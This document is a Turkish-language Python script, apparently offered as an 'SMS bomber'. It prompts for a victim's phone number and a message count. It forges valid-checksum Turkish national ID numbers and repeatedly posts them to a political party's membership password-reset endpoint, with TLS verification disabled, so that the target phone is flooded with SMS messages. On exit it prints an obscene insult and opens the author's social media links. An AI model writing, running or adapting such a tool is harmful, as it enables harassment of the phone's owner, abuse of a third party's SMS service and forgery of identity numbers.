import requests
import json
import urllib3
import time
import random
import os

print("\n")
print("              \033[91m============================")
print("              WELCOME TO Galaxy SMS BOMMER ")
print("                    CODED BY Nachash     ")
print("              ============================\033[0m")

print("\033[91m                 Program başlatılıyor..\033[0m")

time.sleep(2)

print('''
\033[91m
                                                                                                               
     ███▄    █     ▄▄▄          ▄████▄      ██░ ██     ▄▄▄           ██████     ██░ ██ 
 ██ ▀█   █    ▒████▄       ▒██▀ ▀█     ▓██░ ██▒   ▒████▄       ▒██    ▒    ▓██░ ██▒
▓██  ▀█ ██▒   ▒██  ▀█▄     ▒▓█    ▄    ▒██▀▀██░   ▒██  ▀█▄     ░ ▓██▄      ▒██▀▀██░
▓██▒  ▐▌██▒   ░██▄▄▄▄██    ▒▓▓▄ ▄██▒   ░▓█ ░██    ░██▄▄▄▄██      ▒   ██▒   ░▓█ ░██ 
▒██░   ▓██░    ▓█   ▓██▒   ▒ ▓███▀ ░   ░▓█▒░██▓    ▓█   ▓██▒   ▒██████▒▒   ░▓█▒░██▓
░ ▒░   ▒ ▒     ▒▒   ▓▒█░   ░ ░▒ ▒  ░    ▒ ░░▒░▒    ▒▒   ▓▒█░   ▒ ▒▓▒ ▒ ░    ▒ ░░▒░▒
░ ░░   ░ ▒░     ▒   ▒▒ ░     ░  ▒       ▒ ░▒░ ░     ▒   ▒▒ ░   ░ ░▒  ░ ░    ▒ ░▒░ ░
   ░   ░ ░      ░   ▒      ░            ░  ░░ ░     ░   ▒      ░  ░  ░      ░  ░░ ░
         ░          ░  ░   ░ ░          ░  ░  ░         ░  ░         ░      ░  ░  ░
                           ░                                                       
\033[0m
''')
time.sleep(1)
print("")
print("Bilgilendirme: Programdan çıkış yapmak için CTRL + C yapın")

time.sleep(1)
print("")
print("UYARI: Sistem otomatik kendisi T.C oluşturuyor.") 
time.sleep(5)
print("")
print("İlerki zamanlarda aynı numaraya farklı tc girince sistemde sıkıntı olabiliyor.")
time.sleep(0.5)
print("")
print("Bu sebeple sistemin size otomatik verdiği TCyi o numara için not edin.")
time.sleep(0.5)
print("")
print("Tekrar o numaraya sms atmak istediğinizde o TC yi kullanın!")
print("")
try:
	print('''                Powered By Nachash \n''')

	

	urllib3.disable_warnings()
	url = "https://uyelik.chp.org.tr/Default.aspx"

	fayuj_numara = input("Telefon Numarası Girin, Örn: (5xx)-xxx-xx-xx:  ")
	fayuj_delay = int(input("Bekleme Süresi Kaç Saniye (Tavsiye edilen 5): "))
	fayuj_adet = int(input("Gönderilecek Miktar: "))
	fayuj_tc = str(input("T.C Girin, yoksa \"fayuj\" yazınız: "))
	
	def tcolustur():
	    a1=random.randint(1,9)
	    a2=random.randint(0,9)
	    a3=random.randint(0,9)
	    a4=random.randint(0,9)
	    a5=random.randint(0,9)
	    a6=random.randint(0,9)
	    a7=random.randint(0,9)
	    a8=random.randint(0,9)
	    a9=random.randint(0,9)
	    a10=((((a1+a3+a5+a7+a9)*7)-(a2+a4+a6+a8))%10)
	    a11=((a1+a2+a3+a4+a5+a6+a7+a8+a9+a10)%10)
	    sonuc=str(a1)+str(a2)+str(a3)+str(a4)+str(a5)+str(a6)+str(a7)+str(a8)+str(a9)+str(a10)+str(a11)
	    return sonuc

	if fayuj_tc == "fayuj" or fayuj_tc == "fayuj":
		fayuj_tc = tcolustur()
		print(fayuj_numara+" numarası için T.C numaranız: "+fayuj_tc+" NUMARAYA İLK DEFA ATIYORSANIZ NOT EDİN")
		print("")
	else:
		fayuj_tc = fayuj_tc
	headers = {
	"Host": "uyelik.chp.org.tr",
	"Connection": "keep-alive",
	"sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98',
	"sec-ch-ua-mobile": '?0',
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
	"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
	"Cache-Control": "no-cache",
	"X-Requested-With": "XMLHttpRequest",
	"X-MicrosoftAjax": "Delta=true",
	"sec-ch-ua-platform": '"Windows"',
	"Accept": "*/*",
	"Origin": "https://uyelik.chp.org.tr",
	"Sec-Fetch-Site": "same-origin",
	"Sec-Fetch-Mode": "cors",
	"Sec-Fetch-Dest": "empty",
	"Referer": "https://uyelik.chp.org.tr/Default.aspx",
	"Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
	"Cookie": "ASP.NET_SessionId=fhuho2ztrep5l0lob2yydxpi",
	"Accept-Encoding": "gzip, deflate",
	"Content-Length": "3208",
	}
	 
	data = {
	"smkf": "upPanel|btnSorgula",
	"txtTckn": tcolustur(),
	"txtSifreTelefonNumarasi": fayuj_numara,
	"hfFoto": "",
	"hdnFotoUrl": "resimyok.jpg",
	"hdnUyeID": "0",
	"hdnTckn": "0",
	"hdnKrediKartiID": "0",
	"hdnUyeIl": "0",
	"hdnUyeIlce": "0",
	"hdnTelefon": "0",
	"hdnYargitaySorguDurumu": "0",
	"__EVENTTARGET": "",
	"__EVENTARGUMENT": "",
	"__VIEWSTATE": "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",
	"__VIEWSTATEGENERATOR": "CA0B0334",
	"__SCROLLPOSITIONX": "0",
	"__SCROLLPOSITIONY": "0",
	"__ASYNCPOST": "true",
	"btnSorgula": "Şifre gönder",
	}

	i=1
	while i<=fayuj_adet:
		response = requests.post(url, headers=headers, data=data, verify=False,)
		kod = str(response.status_code)
		if kod == "200":
			print(str(i)+". SMS BAŞARIYLA GÖNDERİLDİ! :)")
		else:
			print("HATA OLDU :O KOD: "+kod)
		time.sleep(fayuj_delay)
		i=i+1
		#print("JSON Response ", response.json())
		
except KeyboardInterrupt:
    print ("Program Kapatılıyor...")
    print("")
    print("Siktir git la orospu evladı ♥")
    time.sleep(2)
    os.system("start https://instagram.com/oryahashere")
    os.system("start https://t.me/nachashGOD")
    exit(0)
